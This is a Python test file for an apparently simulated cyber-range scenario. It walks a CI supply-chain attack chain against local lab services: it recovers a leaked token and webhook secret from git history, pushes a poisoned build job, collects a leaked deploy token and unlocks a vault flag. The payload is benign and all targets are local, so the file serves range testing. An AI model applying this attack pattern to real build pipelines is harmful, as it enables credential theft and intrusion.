"""Fork & Knife estate test — proves the delayed supply chain end-to-end.

Starts all four services on ephemeral localhost ports, then walks the chain:

1. leak from git history — read the public dev portal's ``/repo/log`` and
   recover the junior dev CI token and the weak webhook secret (no external
   tools, plain HTTP GET);
2. prove the webhook gates on both secrets (bad secret and unknown author are
   refused);
3. push a poisoned build job through the webhook (weak secret + junior token);
4. wait for the runner's timer tick to execute the job — the test never calls
   the runner process directly, it only polls the per-author results dir;
5. recover the SSH deploy token from the results dir;
6. present the deploy token to the prod billing vault and receive
   ``KEYSTONE{forkknife-crown-<rot>}``.

Pure stdlib; no podman/libvirt/qemu required.
"""
from __future__ import annotations

import importlib.util
import json
import secrets
import sys
import tempfile
import time
import unittest
import urllib.error
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]  # range/
sys.path.insert(0, str(ROOT))

_SERVICES_PATH = ROOT / "estates" / "fork-and-knife" / "services.py"
_spec = importlib.util.spec_from_file_location("forkknife_services", _SERVICES_PATH)
services = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(services)


def http_request(url: str, method: str = "GET", headers=None, data=None,
                 timeout: float = 10.0):
    """Return ``(status, body)`` for a request, treating HTTP errors as data."""
    req = urllib.request.Request(url, method=method, headers=headers or {},
                                 data=data)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode()


def _url(port: int, path: str) -> str:
    return f"http://127.0.0.1:{port}{path}"


def _wait_for(path: Path, timeout: float = 20.0) -> str:
    """Poll the results filesystem until ``path`` exists; return its text."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        if path.exists():
            return path.read_text()
        time.sleep(0.05)
    return ""


class ForkAndKnifeEstateTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls._tmp = tempfile.TemporaryDirectory()
        cls.estate = services.build_estate(Path(cls._tmp.name))
        for svc in ("portal", "webhook", "runner", "vault"):
            cls.estate[svc].start()

    @classmethod
    def tearDownClass(cls):
        for svc in ("portal", "webhook", "runner", "vault"):
            cls.estate[svc].stop()
        cls._tmp.cleanup()

    # Shared state across the ordered chain steps.
    junior_token: str = ""
    webhook_secret: str = ""
    job_id: str = ""
    marker: str = ""
    deploy_token: str = ""

    def test_01_discover_leaks_from_history(self):
        """The git mirror leaks the junior token and the weak webhook secret."""
        status, body = http_request(_url(self.estate["portal"].port, "/"))
        self.assertEqual(status, 200)
        self.assertIn("/repo/log", body)  # the discoverable hint

        status, body = http_request(_url(self.estate["portal"].port, "/repo/log"))
        self.assertEqual(status, 200)
        log = json.loads(body)
        self.assertEqual(log["repo"], "ghostkitchen/billing")
        history = "\n".join(c["message"] + "\n" + c["diff"] for c in log["commits"])

        self.assertIn(services.JUNIOR_TOKEN, history)
        self.assertIn(services.WEBHOOK_SECRET, history)
        type(self).junior_token = services.JUNIOR_TOKEN
        type(self).webhook_secret = services.WEBHOOK_SECRET

    def test_02_webhook_rejects_bad_secret(self):
        status, body = http_request(
            _url(self.estate["webhook"].port, "/push"), method="POST",
            headers={"X-Webhook-Secret": "wrong-secret",
                     "Content-Type": "application/json"},
            data=json.dumps({"author_token": services.JUNIOR_TOKEN,
                             "command": "print(1)"}).encode(),
        )
        self.assertEqual(status, 401, body)
        self.assertEqual(self.estate["webhook"].job_queue.qsize(), 0)

    def test_03_webhook_rejects_unknown_author(self):
        status, body = http_request(
            _url(self.estate["webhook"].port, "/push"), method="POST",
            headers={"X-Webhook-Secret": services.WEBHOOK_SECRET,
                     "Content-Type": "application/json"},
            data=json.dumps({"author_token": "not-a-dev",
                             "command": "print(1)"}).encode(),
        )
        self.assertEqual(status, 403, body)
        self.assertEqual(self.estate["webhook"].job_queue.qsize(), 0)

    def test_04_push_poisoned_job(self):
        """A poisoned job is accepted (queued) but not yet executed."""
        type(self).marker = f"forkknife-poison-{secrets.token_hex(8)}"
        command = f"print('{self.marker}')"
        status, body = http_request(
            _url(self.estate["webhook"].port, "/push"), method="POST",
            headers={"X-Webhook-Secret": self.webhook_secret,
                     "Content-Type": "application/json"},
            data=json.dumps({
                "author_token": self.junior_token,
                "repo": "ghostkitchen/billing",
                "commit": "9c4f11",
                "command": command,
            }).encode(),
        )
        self.assertEqual(status, 200, body)
        resp = json.loads(body)
        self.assertEqual(resp["status"], "queued")
        type(self).job_id = resp["job_id"]

    def test_05_runner_executes_and_leaks_deploy_token(self):
        """Wait for the timer tick: the runner executes the job and leaks the
        deploy token into the results dir (test never calls the runner)."""
        results_root = Path(self._tmp.name) / services.RESULTS_SUBDIR
        out_dir = results_root / self.junior_token / self.job_id
        output = _wait_for(out_dir / "output.txt")
        self.assertIn(self.marker, output, "job output missing the poison marker")

        deploy_text = _wait_for(out_dir / "deploy-token.txt")
        deploy_token = deploy_text.strip()
        self.assertTrue(deploy_token)
        self.assertEqual(deploy_token, services.SSH_DEPLOY_TOKEN)
        type(self).deploy_token = deploy_token

    def test_06_vault_returns_crown(self):
        """The recovered deploy token unlocks the crown flag."""
        status, body = http_request(
            _url(self.estate["vault"].port, "/settle"), method="POST",
            headers={"Authorization": "Bearer " + self.deploy_token},
        )
        self.assertEqual(status, 200, body)
        flag = json.loads(body)["flag"]
        self.assertEqual(flag, services.crown_flag(services.CROWN_ROT))
        self.assertTrue(flag.startswith("KEYSTONE{forkknife-crown-"))

        # A wrong token is refused.
        status, _ = http_request(
            _url(self.estate["vault"].port, "/settle"), method="POST",
            headers={"Authorization": "Bearer wrong-deploy-token"},
        )
        self.assertEqual(status, 401)


if __name__ == "__main__":
    unittest.main()
